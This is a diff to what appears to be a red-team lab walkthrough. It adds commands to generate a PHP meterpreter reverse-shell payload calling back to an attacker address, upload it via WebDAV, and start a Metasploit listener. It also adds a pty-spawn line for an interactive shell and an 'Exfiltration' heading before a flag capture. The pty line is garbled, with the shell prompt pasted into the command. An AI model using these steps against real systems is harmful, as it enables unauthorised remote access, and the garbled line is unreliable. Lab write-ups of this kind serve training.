@@ -102,10 +102,13 @@ Password: `linux4u`
 Upload a PHP reverse shell payload
 
 Create ‘shell.php’ shell script
+`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o shell.php`
 
 ![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/revshell1.png)
 
 Upload payload to WebDAV system
+`cadaver http://192.168.1.105/webdav`
+
 ![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/revshell2.png)
 ![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/revshell3.png)
 ![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/revshell4.png)
@@ -113,6 +116,8 @@ Upload payload to WebDAV system
 Execute payload that you uploaded to the site to open up a meterpreter session
 
 Setup listener
+`msfconsole`
+`use multi/handler`
 
 ![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/list1.png)
 ![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/list2.png)
@@ -126,8 +131,9 @@ Meterpreter session is now open
 ![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/meterpretersession_open.png)
 
 Acquire interactive reverse ‘shell’
+`python -c 'import pty: pty.spawn("/bin/bash")'www-data@server:/var/www/webdav$`
 ![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/intrevshell.png)
-
+#### Exfiltration ####
 Find and capture flag
 ![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/flg1.png)
 ![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/flg2.png)
